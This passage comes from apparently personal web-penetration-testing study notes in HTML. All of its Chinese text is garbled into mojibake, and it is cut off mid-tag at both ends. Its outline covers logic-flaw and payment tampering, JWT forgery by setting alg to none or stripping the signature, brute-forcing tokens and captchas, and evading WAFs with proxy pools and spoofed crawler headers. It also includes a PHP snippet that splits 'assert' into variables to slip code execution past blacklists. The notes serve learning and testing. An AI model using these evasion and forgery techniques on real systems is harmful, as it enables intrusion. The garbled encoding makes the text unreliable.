å¯¹è±¡çš„æŸä¸ªå±æ€§å€¼å‘ç”Ÿå˜åŒ–ï¼Œå³<strong>å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</strong></li></ul><h5 id="åˆ©ç”¨å‰æ"><a href="#åˆ©ç”¨å‰æ" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h5><ul><li>å­˜åœ¨ä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶(merge)</li></ul><h5 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><ul><li>newstar2023 week3 okjigirl</li></ul><h2 id="é€»è¾‘é—®é¢˜"><a href="#é€»è¾‘é—®é¢˜" class="headerlink" title="é€»è¾‘é—®é¢˜"></a>é€»è¾‘é—®é¢˜</h2><h3 id="ä¸šåŠ¡é€»è¾‘"><a href="#ä¸šåŠ¡é€»è¾‘" class="headerlink" title="ä¸šåŠ¡é€»è¾‘"></a>ä¸šåŠ¡é€»è¾‘</h3><h4 id="é€»è¾‘è¶Šæƒ"><a href="#é€»è¾‘è¶Šæƒ" class="headerlink" title="é€»è¾‘è¶Šæƒ"></a>é€»è¾‘è¶Šæƒ</h4><h5 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h5><ul><li>ä¾èµ–äºæ•°æ®åŒ… æŸ¥çœ‹ã€ä¿®æ”¹åŒçº§åˆ«ç”¨æˆ·çš„ä¿¡æ¯</li></ul><h5 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h5><ul><li>ä¸‹è½½æºç æˆ–è‡ªè¡Œæ„é€ ç®¡ç†å‘˜å‘½ä»¤æ•°æ®åŒ…</li><li>ä½¿ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½è¯æ˜æ›¿æ¢ç®¡ç†å‘˜èº«ä»½è¯æ˜ ä»ç„¶å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜åŠŸèƒ½</li></ul><h4 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h4><h5 id="å‰ç«¯éªŒè¯"><a href="#å‰ç«¯éªŒè¯" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h5><ul><li>èº«ä»½ä¸åŒåªæœ‰çœ‹åˆ°çš„ä»£ç ä¸åŒï¼Œå®ç°åŠŸèƒ½çš„éƒ¨åˆ†æ²¡æœ‰åšéªŒè¯</li></ul><h4 id="å·¥å…·ä½¿ç”¨-1"><a href="#å·¥å…·ä½¿ç”¨-1" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h4><ul><li>ä¸­é€šæ£€æµ‹å·¥å…·</li><li>secson-check</li><li>burpæ’ä»¶ authz</li></ul><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><ul><li>å‰åç«¯åŒæ—¶éªŒè¯</li><li>æ¯ä¸ªåŠŸèƒ½ç‚¹éƒ½éªŒè¯æƒé™</li><li>åŠ å¯†</li><li>è¿‡æ»¤å‚æ•°</li></ul><h3 id="ç™»å½•è„†å¼±"><a href="#ç™»å½•è„†å¼±" class="headerlink" title="ç™»å½•è„†å¼±"></a>ç™»å½•è„†å¼±</h3><h4 id="è´¦å·å¯†ç çˆ†ç ´"><a href="#è´¦å·å¯†ç çˆ†ç ´" class="headerlink" title="è´¦å·å¯†ç çˆ†ç ´"></a>è´¦å·å¯†ç çˆ†ç ´</h4><ul><li>æ˜æ–‡ä¼ è¾“</li><li>åŠ å¯†ä¼ è¾“</li></ul><h4 id="cookieè„†å¼±"><a href="#cookieè„†å¼±" class="headerlink" title="cookieè„†å¼±"></a>cookieè„†å¼±</h4><ul><li>æºç å®¡è®¡</li><li>æ‰‹åŠ¨çœ‹ç™»é™†åçš„cookie</li></ul><h3 id="æ•°æ®ç¯¡æ”¹-æ”¯ä»˜æ¼æ´"><a href="#æ•°æ®ç¯¡æ”¹-æ”¯ä»˜æ¼æ´" class="headerlink" title="æ•°æ®ç¯¡æ”¹(æ”¯ä»˜æ¼æ´)"></a>æ•°æ®ç¯¡æ”¹(æ”¯ä»˜æ¼æ´)</h3><h4 id="å¸¸è§å‚æ•°"><a href="#å¸¸è§å‚æ•°" class="headerlink" title="å¸¸è§å‚æ•°"></a>å¸¸è§å‚æ•°</h4><ul><li>è®¢å•å·</li><li>å•†å“æ•°é‡ã€å•ä»·</li><li>æ”¯ä»˜æ¥å£</li><li>æ”¯ä»˜çŠ¶æ€</li></ul><h4 id="å¸¸è§ä¿®æ”¹æ–¹æ³•"><a href="#å¸¸è§ä¿®æ”¹æ–¹æ³•" class="headerlink" title="å¸¸è§ä¿®æ”¹æ–¹æ³•"></a>å¸¸è§ä¿®æ”¹æ–¹æ³•</h4><ul><li>æ›¿æ¢æ”¯ä»˜</li><li>é‡å¤æ”¯ä»˜</li><li>æœ€å°é¢æ”¯ä»˜</li><li>è´Ÿæ•°æ”¯ä»˜</li><li>æº¢å‡ºæ”¯ä»˜</li><li>ä¼˜æƒ åˆ¸æ”¯ä»˜</li></ul><h3 id="æ‰¾å›ç»•è¿‡"><a href="#æ‰¾å›ç»•è¿‡" class="headerlink" title="æ‰¾å›ç»•è¿‡"></a>æ‰¾å›ç»•è¿‡</h3><h4 id="éªŒè¯å’Œæ“ä½œä¸åŒæ—¶"><a href="#éªŒè¯å’Œæ“ä½œä¸åŒæ—¶" class="headerlink" title="éªŒè¯å’Œæ“ä½œä¸åŒæ—¶"></a>éªŒè¯å’Œæ“ä½œä¸åŒæ—¶</h4><ul><li>ç›´æ¥æ“ä½œç»•è¿‡éªŒè¯</li></ul><h4 id="å‰ç«¯éªŒè¯-1"><a href="#å‰ç«¯éªŒè¯-1" class="headerlink" title="å‰ç«¯éªŒè¯"></a>å‰ç«¯éªŒè¯</h4><ul><li>burpæŠ“è¿”å›åŒ… ä¿®æ”¹è¿”å›å€¼</li><li>åç«¯éªŒè¯åˆ™æ— æ•ˆ</li></ul><h3 id="token-éªŒè¯ç "><a href="#token-éªŒè¯ç " class="headerlink" title="token éªŒè¯ç "></a>token éªŒè¯ç </h3><h4 id="éªŒè¯ç å®‰å…¨"><a href="#éªŒè¯ç å®‰å…¨" class="headerlink" title="éªŒè¯ç å®‰å…¨"></a>éªŒè¯ç å®‰å…¨</h4><ul><li>å®¢æˆ·ç«¯å›æ˜¾(æ•°æ®åŒ…ç›´æ¥èƒ½çœ‹åˆ°)</li><li>éªŒè¯ç å¤ç”¨</li><li>éªŒè¯ç çˆ†ç ´(å·¥å…· pkavhttpfuzzer æ’ä»¶ reCAPTCHA captcha-killer)</li><li>ç»•è¿‡</li></ul><h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><ul><li>çˆ†ç ´(è¯†åˆ«æˆ–çŒœæµ‹å‡ºåŠ å¯†æ–¹æ³•)</li><li>å›æ˜¾(ä¸‹ä¸€tokenåœ¨responseä¸­å¯ä»¥çœ‹åˆ° åˆ©ç”¨burpæ­£åˆ™åŒ¹é…è‡ªåŠ¨å¡«å†™)</li></ul><h2 id="JAVA-å®‰å…¨"><a href="#JAVA-å®‰å…¨" class="headerlink" title="JAVA å®‰å…¨"></a>JAVA å®‰å…¨</h2><h4 id="javascriptåŸå‹é“¾æ±¡æŸ“"><a href="#javascriptåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="javascriptåŸå‹é“¾æ±¡æŸ“"></a>javascriptåŸå‹é“¾æ±¡æŸ“</h4><h4 id="sqlæ³¨å…¥-1"><a href="#sqlæ³¨å…¥-1" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><ul><li>sessionæ³¨å…¥</li><li>åˆ©ç”¨é¢„ç¼–è¯‘é˜²æ­¢æ³¨å…¥(è§£å†³å¤§éƒ¨åˆ†é—®é¢˜)</li><li>ç»•è¿‡é¢„ç¼–è¯‘â†‘ <code>case when</code> è¦æ±‚ æ•°æ®æŒ‰æŸé¡¹å…ƒç´ æ’åºä¸”æ”¹åˆ—åå¯æ§ <code>order by + column</code></li></ul><h3 id="JWTå®‰å…¨"><a href="#JWTå®‰å…¨" class="headerlink" title="JWTå®‰å…¨"></a>JWTå®‰å…¨</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><ul><li><a href="https://blog.csdn.net/weixin_50464560/article/details/120579337">JWTæ”»å‡»æ‰‹å†Œ(é™„jwt_toolç”¨æ³•,çˆ†ç ´å¼±å¯†é’¥ç­‰)</a></li><li>json web token è·¨åŸŸéªŒè¯èº«ä»½çš„æ–¹æ¡ˆ</li><li>ä¸åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼Œä½†èƒ½é€šè¿‡æ•°å­—ç­¾åæ¥éªŒè¯æ•°æ®æœªè¢«ç¯¡æ”¹ã€</li></ul><h4 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h4><ul><li>å¤´(base64) å­˜å‚¨åŠ å¯†æ–¹å¼</li><li>å£°æ˜(base64) å­˜å‚¨æ•°æ®</li><li>ç­¾å(å¤´éƒ¨çš„åŠ å¯†æ–¹å¼ç»“åˆå¯†åŒ™)</li></ul><h4 id="ä¼ªé€ "><a href="#ä¼ªé€ " class="headerlink" title="ä¼ªé€ "></a>ä¼ªé€ </h4><ul><li>æœ‰å¯†åŒ™çš„è¯ç›´æ¥è§£ æ— å¯†åŒ™å¾€ä¸‹èµ°</li><li>ç›´æ¥å°†å¤´éƒ¨åŠ å¯†æ–¹å¼è®¾ä¸º none</li><li>å¤±æ•ˆæ—¶é—´æ”¹ä¸ºé å</li><li>åˆ é™¤ç­¾åéƒ¨åˆ†</li><li>ä¿®æ”¹å¯èƒ½è¢«urlç¼–ç çš„ç¬¦å·<code>+å˜- /å˜_ =å»æ‰</code></li></ul><h4 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><ul><li>æ‹¿åˆ°ä»¤ç‰Œtoken è§£ç å‡ºåŠ å¯†æ–¹å¼å’Œå£°æ˜å†…å®¹</li><li>é€šè¿‡è„šæœ¬å®Œæˆä»¥ä¸‹å†…å®¹</li><li>æ‰¹é‡è·‘å­—å…¸æ¥é€šè¿‡æŒ‡å®šçš„åŠ å¯†æ–¹å¼åŠ å¯†å†…å®¹</li><li>æ¯”å¯¹å¾—åˆ°çš„ç­¾åbase64ç¼–ç åå’ŒåŸå§‹ç­¾åæ˜¯å¦ä¸€è‡´</li><li>å½“åŒ¹é…åˆ°ä¸€è‡´ååˆ™è¾“å‡ºè¯¥å¯†åŒ™</li></ul><h3 id="å…¶ä»–æ¼æ´çš„javaå½¢å¼"><a href="#å…¶ä»–æ¼æ´çš„javaå½¢å¼" class="headerlink" title="å…¶ä»–æ¼æ´çš„javaå½¢å¼"></a>å…¶ä»–æ¼æ´çš„javaå½¢å¼</h3><h4 id="æ–‡ä»¶ä¸Šä¼ -1"><a href="#æ–‡ä»¶ä¸Šä¼ -1" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><ul><li>ä»»æ„ç›®å½•è¦†ç›–ä¸Šä¼ </li><li>ç»•è¿‡ç›®å½•è§£æï¼Œæ‰§è¡Œè„šæœ¬</li></ul><h4 id="ä¸å®‰å…¨ç™»å½•"><a href="#ä¸å®‰å…¨ç™»å½•" class="headerlink" title="ä¸å®‰å…¨ç™»å½•"></a>ä¸å®‰å…¨ç™»å½•</h4><ul><li>è´¦å·å¯†ç å¯ç›´æ¥åœ¨jsè·å¾—</li></ul><p>â€¦</p><ul><li>âš javaWebçš„å‚æ•°ä¸ä»¥å‚æ•°åè¯†åˆ«ï¼Œåªä¸ä¼ å‚é¡ºåºæœ‰å…³</li></ul><h4 id="appå®‰å…¨"><a href="#appå®‰å…¨" class="headerlink" title="appå®‰å…¨"></a>appå®‰å…¨</h4><ul><li>ä¸€é”®åç¼–è¯‘</li><li>æ¼äº†ä¸ªå¤§æ´</li></ul><h2 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h2><h3 id="ç³»ç»Ÿæ¼æ´"><a href="#ç³»ç»Ÿæ¼æ´" class="headerlink" title="ç³»ç»Ÿæ¼æ´"></a>ç³»ç»Ÿæ¼æ´</h3><h4 id="æ¢é’ˆå·¥å…·"><a href="#æ¢é’ˆå·¥å…·" class="headerlink" title="æ¢é’ˆå·¥å…·"></a>æ¢é’ˆå·¥å…·</h4><ul><li><p>Goby(ç•Œé¢å‹å¥½ï¼Œå¿«é€Ÿ)[<a href="https://gobies.org]">https://gobies.org]</a></p></li><li><p>Nmap(æ”¯æŒè‡ªå®šä¹‰æ’ä»¶)</p><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul><li>å…¨é¢ é«˜æ•ˆ </li><li>éœ€è¦è‡ªè¡Œå¼€å¯Tanable NessusæœåŠ¡ååœ¨æµè§ˆå™¨ç«¯ä½¿ç”¨</li><li><a href="https://www.freebuf.com/sectool/350938.html">Nessus ç¦»çº¿ç ´è§£æ›´æ–°æ’ä»¶æ•™ç¨‹</a></li></ul></li><li><p>OpenVAS</p></li><li><p>Nexpose</p></li></ul><h4 id="æ¼æ´ç±»å‹"><a href="#æ¼æ´ç±»å‹" class="headerlink" title="æ¼æ´ç±»å‹"></a>æ¼æ´ç±»å‹</h4><ul><li>è¿œç¨‹ä»£ç æ‰§è¡Œ</li><li>æƒé™æå‡</li><li>ç¼“å†²åŒºæº¢å‡º</li><li>â€¦</li></ul><h4 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h4><h5 id="å·¥å…·æ¡†æ¶"><a href="#å·¥å…·æ¡†æ¶" class="headerlink" title="å·¥å…·æ¡†æ¶"></a>å·¥å…·æ¡†æ¶</h5><ul><li>æ¸—é€æµ‹è¯•å·¥å…·Metasploit  -&gt; kaliå’Œå¿è€…ä¸Šè£…è½½çš„msfconsole</li><li>Searchsploit æ¼æ´æŸ¥æ‰¾å·¥å…·</li><li>ä¼ä¸šå•ä½å†…éƒ¨äº§å“</li></ul><p>â€‹ä¸€èˆ¬åˆ©ç”¨searchsploitæˆ–è€…ç›´æ¥åœ¨æ¢é’ˆå·¥å…·ä¸Šæ‰¾åˆ°æ¼æ´å¯¹åº”ç¼–å· åˆ©ç”¨msfè¿›è¡Œæµ‹è¯•</p><h5 id="å•ç‚¹Exp"><a href="#å•ç‚¹Exp" class="headerlink" title="å•ç‚¹Exp"></a>å•ç‚¹Exp</h5><ul><li>cmd</li><li>å›½å†…æ¼æ´å…±äº«å¹³å°[<a href="https://www.cnvd.org.cn]">https://www.cnvd.org.cn]</a></li><li>çŸ¥é“åˆ›å®‡[<a href="https://www.seebug.org]">https://www.seebug.org]</a></li><li>1337day[<a href="https://mrxn.net/share/0day-today.html]">https://mrxn.net/share/0day-today.html]</a></li><li><a href="https://exploit-db.com/">https://exploit-db.com</a></li><li>Packetstorm Security</li></ul><h4 id="å¦‚ä½•ä¿®å¤"><a href="#å¦‚ä½•ä¿®å¤" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h4><ul><li>æ‰“è¡¥ä¸</li><li>360 â€¦</li><li>å…³é—­å…¥å£</li><li>é˜²æŠ¤åº”ç”¨</li></ul><h3 id="webæ¼æ´"><a href="#webæ¼æ´" class="headerlink" title="webæ¼æ´"></a>webæ¼æ´</h3><h4 id="å·²çŸ¥cms"><a href="#å·²çŸ¥cms" class="headerlink" title="å·²çŸ¥cms"></a>å·²çŸ¥cms</h4><ul><li>å¦‚å¸¸è§çš„dedecms.discuz,wordpressç­‰æºç ç»“æ„ï¼Œå¯åˆ©ç”¨å…¬å¼€çš„æ¼æ´(vulhub,seebugâ€¦)è¿›è¡Œæµ‹è¯•ï¼Œæˆ–è€…è‡ªè¡Œä¸‹è½½cmsä»£ç è¿›è¡Œç™½ç›’å®¡è®¡</li></ul><h4 id="å·²çŸ¥å¼€å‘æ¡†æ¶"><a href="#å·²çŸ¥å¼€å‘æ¡†æ¶" class="headerlink" title="å·²çŸ¥å¼€å‘æ¡†æ¶"></a>å·²çŸ¥å¼€å‘æ¡†æ¶</h4><ul><li>å¦‚thinkphp, spring, flaskç­‰å¼€å‘çš„æºç ç¨‹åºï¼Œè·å–ç›¸åº”çš„æ¡†æ¶ä¿¡æ¯ï¼Œé€šè¿‡å…¬å…±çš„å®‰å…¨é—®é¢˜è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è‡ªè¡Œç™½ç›’å®¡è®¡</li></ul><h4 id="æœªçŸ¥cms"><a href="#æœªçŸ¥cms" class="headerlink" title="æœªçŸ¥cms"></a>æœªçŸ¥cms</h4><ul><li>å¯èƒ½æ˜¯ä¼ä¸šçš„æˆ–ä¸ªäººçš„å†…éƒ¨ç¨‹åºæºç ï¼Œä¹Ÿå¯èƒ½æ˜¯æŸcmsäºŒæ¬¡å¼€å‘çš„æºç ç»“æ„ï¼Œé’ˆå¯¹æ­¤ç±»æºç ç¨‹åºï¼Œå¦‚æœèƒ½è¯†åˆ«å‡ºäºŒæ¬¡å¼€å‘å°±æŒ‰å·²çŸ¥çš„cmsæ€è·¯è¿›è¡Œï¼Œä¸èƒ½ç¡®å®šäºŒæ¬¡å¼€å‘çš„è¯å¯ä»¥åˆ©ç”¨å¸¸è§„ç»¼åˆç±»æ‰«æå·¥å…·æˆ–è„šæœ¬è¿›è¡Œæ¼æ‰«ï¼Œä¹Ÿå¯ä»¥äººå·¥æ¢é’ˆ(åŠŸèƒ½ç‚¹ï¼Œå‚æ•°ï¼Œç›²çŒœ)ï¼Œå¦‚æœèƒ½æ‹¿åˆ°æºç åˆ™è¿›è¡Œç™½ç›’å®¡è®¡</li></ul><h5 id="æ¼æ‰«å·¥å…·"><a href="#æ¼æ‰«å·¥å…·" class="headerlink" title="æ¼æ‰«å·¥å…·"></a>æ¼æ‰«å·¥å…·</h5><ul><li><a href="https://blog.csdn.net/weixin_42248871/article/details/120981838">Xrayç®€å•ä½¿ç”¨</a></li><li><a href="https://zhuanlan.zhihu.com/p/384677028">AWVSä¸‹è½½ã€å®‰è£…ã€ä½¿ç”¨æ•™ç¨‹</a></li><li>appscan</li></ul><h3 id="appæ¼æ´"><a href="#appæ¼æ´" class="headerlink" title="appæ¼æ´"></a>appæ¼æ´</h3><h4 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h4><h5 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h5><ul><li>burp</li><li>charles</li><li>fiddler</li><li>æŠ“åŒ…ç²¾çµ</li></ul><h5 id="å…¶ä»–åè®®"><a href="#å…¶ä»–åè®®" class="headerlink" title="å…¶ä»–åè®®"></a>å…¶ä»–åè®®</h5><ul><li>wireshark</li></ul><h5 id="burpï¼‹xray"><a href="#burpï¼‹xray" class="headerlink" title="burpï¼‹xray"></a>burpï¼‹xray</h5><p>åˆ©ç”¨burpæŠ“åŒ…è½¬å‘åˆ°æœ¬æœºç«¯å£(6666) xrayç›‘å¬æœ¬æœº6666ç«¯å£è¢«åŠ¨æ‰«æ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><ul><li>æ¼äº†ä¸ªå¤§æ´</li><li>ä¸€é”®åç¼–è¯‘</li></ul><h3 id="æœåŠ¡åè®®"><a href="#æœåŠ¡åè®®" class="headerlink" title="æœåŠ¡åè®®"></a>æœåŠ¡åè®®</h3><h4 id="ç«¯å£æœåŠ¡"><a href="#ç«¯å£æœåŠ¡" class="headerlink" title="ç«¯å£æœåŠ¡"></a>ç«¯å£æœåŠ¡</h4><ul><li>webæœåŠ¡ç±»</li><li>æ•°æ®åº“ç±»</li><li>å¤§æ•°æ®ç±»</li><li>æ–‡ä»¶å…±äº«</li><li>è¿œç¨‹è®¿é—®</li><li>é‚®ä»¶æœåŠ¡</li><li>å…¶ä»–æœåŠ¡</li></ul><h4 id="å¼±å£ä»¤çˆ†ç ´"><a href="#å¼±å£ä»¤çˆ†ç ´" class="headerlink" title="å¼±å£ä»¤çˆ†ç ´"></a>å¼±å£ä»¤çˆ†ç ´</h4><ul><li>åŸºäºç½‘é¡µçš„å¯åˆ©ç”¨burpçˆ†ç ´</li><li>åŸºäºåè®®(ssh,mysqlç­‰)çš„å¼±å£ä»¤çˆ†ç ´å¯åˆ©ç”¨å·¥å…·</li></ul><h4 id="apiæ¥å£"><a href="#apiæ¥å£" class="headerlink" title="apiæ¥å£"></a>apiæ¥å£</h4><ul><li>éƒ¨åˆ†ç½‘ç«™è°ƒç”¨æ¥å£api(å¦‚WSDL)å¯åˆ©ç”¨æ¼æ‰«å·¥å…·æ‰«æ</li></ul><h2 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h2><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><h4 id="åçˆ¬è™«å»¶æ—¶ä»£ç†æ± "><a href="#åçˆ¬è™«å»¶æ—¶ä»£ç†æ± " class="headerlink" title="åçˆ¬è™«å»¶æ—¶ä»£ç†æ± "></a>åçˆ¬è™«å»¶æ—¶ä»£ç†æ± </h4><ul><li>å»¶æ—¶çˆ¬å–</li><li>ç™¾åº¦ç­‰çˆ¬è™«å¤´</li><li>ä»˜è´¹ä»£ç†æ± </li></ul><h4 id="ä»£ç†æ± æŒ‡çº¹è¢«åŠ¨æ¢é’ˆ"><a href="#ä»£ç†æ± æŒ‡çº¹è¢«åŠ¨æ¢é’ˆ" class="headerlink" title="ä»£ç†æ± æŒ‡çº¹è¢«åŠ¨æ¢é’ˆ"></a>ä»£ç†æ± æŒ‡çº¹è¢«åŠ¨æ¢é’ˆ</h4><p><strong>æ‰«æå·¥å…·çš„æŒ‡çº¹(å¦‚uaæˆ–è€…ä¸€äº›payload) å®¹æ˜“è¢«wafè®°å½•å¹¶è¯†åˆ« æ­¤æ—¶å¯ä»¥é‡‡ç”¨ä¸€äº›æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</strong></p><ul><li>ä»£ç†æ±  Proxy_pool (æ­è¿‡ å…è´¹çš„æä¸å¥½ç”¨  å»ºè®®å……é’±)</li><li>å»¶æ—¶ è¢«åŠ¨æ‰«æ  </li><li>payloadç»•è¿‡</li></ul><h5 id="å·¥å…·ä¹‹é—´çš„è”åŠ¨"><a href="#å·¥å…·ä¹‹é—´çš„è”åŠ¨" class="headerlink" title="å·¥å…·ä¹‹é—´çš„è”åŠ¨"></a>å·¥å…·ä¹‹é—´çš„è”åŠ¨</h5><ul><li>ä½¿ç”¨awvs(åˆæ¬¡æ‰«æï¼Œæ§åˆ¶é€Ÿåº¦) + burp(æŸ¥çœ‹å‘åŒ…é€Ÿåº¦å’Œæ•°æ®) + xray(äºŒæ¬¡æ‰«æ)</li><li>xrayæ— æ³•æ§åˆ¶å»¶æ—¶å’ŒUA æ‰€ä»¥ç”¨awvsæ§åˆ¶  ä¸¤æ¬¡æ‰«æå¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé¿å…payloadè¯†åˆ«æ‹¦æˆª</li></ul><h4 id="æ¼æ´åˆ©ç”¨-å¯èƒ½è¢«æ‹¦æˆªçš„æ´"><a href="#æ¼æ´åˆ©ç”¨-å¯èƒ½è¢«æ‹¦æˆªçš„æ´" class="headerlink" title="æ¼æ´åˆ©ç”¨(å¯èƒ½è¢«æ‹¦æˆªçš„æ´)"></a>æ¼æ´åˆ©ç”¨(å¯èƒ½è¢«æ‹¦æˆªçš„æ´)</h4><h5 id="sqlæ³¨å…¥-2"><a href="#sqlæ³¨å…¥-2" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h5><ul><li>sqlmap  ä¸Šä»£ç†è¿‡cc  UAçˆ¬è™«å¤´è¿‡å·¥å…·æŒ‡çº¹é»‘åå•</li><li>è‡ªå·±ç¼–å†™tamperæ¨¡å— ç»•å„ç§payloadæ‹¦æˆª</li></ul><h5 id="æ–‡ä»¶ä¸Šä¼ -2"><a href="#æ–‡ä»¶ä¸Šä¼ -2" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h5><ul><li><p>æ–‡ä»¶åå›è½¦æˆªæ–­</p><p><a href="#upload_waf">å‰æ–‡æåˆ°</a></p></li></ul><h5 id="xssè·¨ç«™"><a href="#xssè·¨ç«™" class="headerlink" title="xssè·¨ç«™"></a>xssè·¨ç«™</h5><ul><li><a href="#xss_bypass">xss_bypass</a></li><li>xsstrike(å·¥å…· å¯ä»¥é…ç½®ä»£ç†å’Œå»¶æ—¶)</li></ul><h5 id="æ–‡ä»¶åŒ…å«-1"><a href="#æ–‡ä»¶åŒ…å«-1" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">æ–‡ä»¶åŒ…å«</a></h5><h5 id="RCEæ‰§è¡Œ"><a href="#RCEæ‰§è¡Œ" class="headerlink" title="RCEæ‰§è¡Œ"></a>RCEæ‰§è¡Œ</h5><ul><li>åå…­è¿›åˆ¶ç¼–ç è§£ç  åˆ©ç”¨assert()å‡½æ•°æ‰§è¡Œ</li><li>str_replace è¿›è¡Œå­—ç¬¦æ›¿æ¢ç»•è¿‡é»‘åå•</li><li>å˜é‡æ‹†åˆ†ç»„åˆ <code>$a=&quot;asse&quot;;$b=&quot;rt&quot;;$c=$a.$b;$c()</code></li><li>æ›´æ”¹è¯·æ±‚æ–¹å¼ <code>get post request</code></li></ul><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><h4 id="å·¥å…·åˆ©ç”¨"><a href="#å·¥å…·åˆ©ç”¨" class="headerlink" title="å·¥å…·åˆ©ç”¨"></a>å·¥å…·åˆ©ç”¨</h4><ul><li>ä½¿ç”¨fortifyè¿›è¡Œç™½ç›’å®¡è®¡(ä»»æ„ç±»å‹æ–‡ä»¶)</li><li>ä½¿ç”¨seayè¿›è¡Œphpå®¡è®¡</li></ul><h4 id="æ‰‹å·¥-è„šæœ¬å®¡è®¡"><a href="#æ‰‹å·¥-è„šæœ¬å®¡è®¡" class="headerlink" title="æ‰‹å·¥&#x2F;è„šæœ¬å®¡è®¡"></a>æ‰‹å·¥&#x2F;è„šæœ¬å®¡è®¡</h4><h5 id="å…³é”®å­—æœç´¢"><a href="#å…³é”®å­—æœç´¢" class="headerlink" title="å…³é”®å­—æœç´¢"></a>å…³é”®å­—æœç´¢</h5><ul><li>æ¥å—å‚æ•° <code>$_get</code> ä¹‹ç±»çš„ å’Œ è¾“å‡ºç±»å‡½æ•° å¦‚<code>echo</code></li><li>æ•°æ®åº“æ“ä½œå…³é”®è¯ <code>select</code> <code>insert</code> <code>update</code> <code>sqlæ‰§è¡Œè¯­å¥</code></li><li>å‘½ä»¤æ‰§è¡Œå…³é”®è¯ <code>exec</code></li></ul><h5 id="åŠŸèƒ½ç‚¹"><a href="#åŠŸèƒ½ç‚¹" class="headerlink" title="åŠŸèƒ½ç‚¹"></a>åŠŸèƒ½ç‚¹</h5><ul><li>æ–‡ä»¶ä¼ è¾“å¤„(å¦‚ä¼šå‘˜ä¸­å¿ƒ)å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶è¯»å– æ–‡ä»¶æ‰§è¡Œ</li><li>ç™»å½•æ¡†å­˜åœ¨xss sqlæ³¨å…¥</li></ul><h5 id="æ–­ç‚¹è°ƒè¯•"><a href="#æ–­ç‚¹è°ƒè¯•" class="headerlink" title="æ–­ç‚¹è°ƒè¯•"></a>æ–­ç‚¹è°ƒè¯•</h5><ul><li>æ‰§è¡Œè¿‡ç¨‹å‰åé¡ºåº</li><li>è°ƒç”¨æ–‡ä»¶åˆ—è¡¨</li></ul><h4 id="phpæ— 